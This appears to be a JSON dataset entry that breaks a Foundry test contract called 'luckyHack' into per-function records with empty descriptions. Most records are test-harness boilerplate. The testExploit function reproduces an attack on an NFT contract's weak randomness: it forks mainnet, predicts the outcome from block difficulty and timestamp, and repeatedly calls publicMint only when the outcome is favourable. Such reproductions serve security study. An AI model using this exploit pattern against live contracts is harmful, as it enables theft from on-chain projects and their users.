[
  {
    "contract/interface": "luckyHack",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "luckyHack",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "luckyHack",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "luckyHack",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "luckyHack",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "luckyHack",
    "source_type": "attacker_contract",
    "function_name": "getBalance",
    "original_code": "    function getBalance() external view returns (uint256) {\n        return address(this).balance;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "luckyHack",
    "source_type": "attacker_contract",
    "function_name": "getRandom",
    "original_code": "    function getRandom() public view returns (uint256) {\n        if (uint256(keccak256(abi.encodePacked(block.difficulty, block.timestamp))) % 2 == 0) {\n            return 0;\n        } else {\n            return 1;\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "luckyHack",
    "source_type": "attacker_contract",
    "function_name": "onERC721Received",
    "original_code": "    function onERC721Received(address, address, uint256, bytes memory) public pure returns (bytes4) {\n        return this.onERC721Received.selector;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "luckyHack",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 15_403_430); // fork mainnet block number 15403430\n        vm.deal(address(this), 3 ether);\n        vm.deal(address(nftAddress), 5 ether);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "luckyHack",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "luckyHack",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "luckyHack",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "luckyHack",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "luckyHack",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "luckyHack",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "luckyHack",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        vm.warp(1_661_351_167);\n        console.log(\"getRandom\", getRandom());\n\n        uint256 amount = 10;\n\n        if (uint256(keccak256(abi.encodePacked(block.difficulty, block.timestamp))) % 2 == 0) {\n            revert(\"Not lucky\");\n        }\n        bytes memory data = abi.encodeWithSignature(\"publicMint()\");\n\n        for (uint256 i = 0; i < amount; ++i) {\n            (bool status,) = address(nftAddress).call{value: 0.01 ether}(data);\n            if (!status) {\n                revert(\"error\");\n            } else {\n                emit Log(\"success\");\n            }\n",
    "description": ""
  }
]